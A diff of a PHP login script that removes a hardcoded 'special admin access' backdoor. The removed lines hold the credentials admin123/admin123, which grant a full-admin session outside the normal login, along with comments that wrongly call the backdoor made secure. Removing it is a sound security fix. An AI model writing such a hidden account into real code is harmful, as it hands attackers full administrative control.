@@ -37,29 +37,6 @@ if (strlen($username) > 50 || strlen($password) > 255) {
     exit();
 }
 
-// ======= SPECIAL ADMIN ACCESS ======= //
-// Hardcoded credentials should be avoided, but since they exist, we'll at least make them more secure
-$specialAdminUser = 'admin123';
-$specialAdminPass = 'admin123';
-
-// Use hash_equals for timing attack protection
-if ($username === $specialAdminUser && hash_equals($password, $specialAdminPass)) {
-    // Regenerate session ID to prevent session fixation
-    session_regenerate_id(true);
-    
-    $_SESSION['admin_id'] = 9999; // Special ID
-    $_SESSION['username'] = htmlspecialchars($specialAdminUser, ENT_QUOTES, 'UTF-8');
-    $_SESSION['role'] = 'Full Admin';
-    $_SESSION['logged_in'] = true;
-    $_SESSION['last_activity'] = time(); // Track session activity
-    
-    $response['success'] = true;
-    $response['message'] = 'Login successful (special admin access)';
-    echo json_encode($response);
-    exit();
-}
-// ======= END SPECIAL ADMIN ACCESS ======= //
-
 // Check if the request is a POST request
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Check if the action is login
